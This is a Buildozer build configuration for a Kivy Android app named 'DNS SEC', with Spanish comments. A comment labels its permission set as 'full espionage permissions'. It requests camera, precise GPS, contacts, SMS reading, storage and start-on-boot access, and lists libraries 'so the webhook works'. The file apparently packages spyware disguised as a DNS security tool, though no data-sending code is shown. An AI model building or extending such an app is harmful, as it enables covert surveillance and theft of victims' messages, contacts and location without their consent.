[app]

# Información de la App
title = DNS SEC
package.name = dnssec_jvs
package.domain = com.javic888
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 2.0

# --- FULL PERMISOS DE ESPIONAJE (Javic888 Exclusive) ---
# Acceso a: Internet, Cámara, Ubicación GPS, Almacenamiento, Contactos y SMS
android.permissions = INTERNET, ACCESS_NETWORK_STATE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, CAMERA, ACCESS_FINE_LOCATION, READ_CONTACTS, READ_SMS, RECEIVE_BOOT_COMPLETED, VIBRATE

# Configuración de ejecución
orientation = portrait
fullscreen = 1
android.arch = arm64-v8a
python_version = 3

# Librerías necesarias para que el Webhook funcione
requirements = python3,kivy,requests,urllib3,certifi,idna

[buildozer]
log_level = 2
warn_on_root = 1

# Configuración del empaquetado
[android]
# (9) Android SDK version
android.api = 31
android.minapi = 21
android.ndk = 25b
android.skip_update = False
android.accept_sdk_license = True

# Icono (opcional: si subes una imagen llamada icon.png a tu repo)
# icon.filename = %(source.dir)s/icon.png
